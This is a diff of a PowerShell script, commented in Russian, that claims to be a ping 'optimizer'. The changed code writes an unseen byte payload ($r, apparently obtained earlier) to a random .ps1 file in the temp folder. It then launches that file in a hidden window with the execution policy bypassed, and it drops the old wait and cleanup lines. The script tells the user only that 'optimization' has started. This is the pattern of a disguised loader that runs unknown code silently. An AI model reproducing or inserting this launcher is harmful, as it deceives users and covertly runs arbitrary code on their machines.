@@ -56,26 +56,20 @@ try {
     
     $global:MaxPing = $ping
     
-    # Сохраняем во временный файл
+    # Сохраняем как PS1 файл (ВАЖНО!)
     $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).ps1"
     [System.IO.File]::WriteAllBytes($tempFile, $r)
     
     Write-Host "  [*] Starting optimizer..." -ForegroundColor Yellow
     
-    # Запускаем с параметром ping
-    $process = Start-Process $tempFile -ArgumentList $ping -WindowStyle Hidden -PassThru
-    
-    # Ждём завершения (опционально)
-    # $process.WaitForExit()
+    # Запускаем PS1 файл правильно
+    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`" -Ping $ping"
+    Start-Process powershell.exe -ArgumentList $arguments -WindowStyle Hidden
     
     Write-Host "  [✓] Optimization started!" -ForegroundColor Green
     Write-Host ""
     Write-Host "  Press any key to exit..." -ForegroundColor Gray
     $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-    
-    # Очистка (можно раскомментировать)
-    # Start-Sleep -Seconds 10
-    # Remove-Item $tempFile -Force -EA 0
     
 } catch {
     Write-Progress -Activity "Error" -Completed
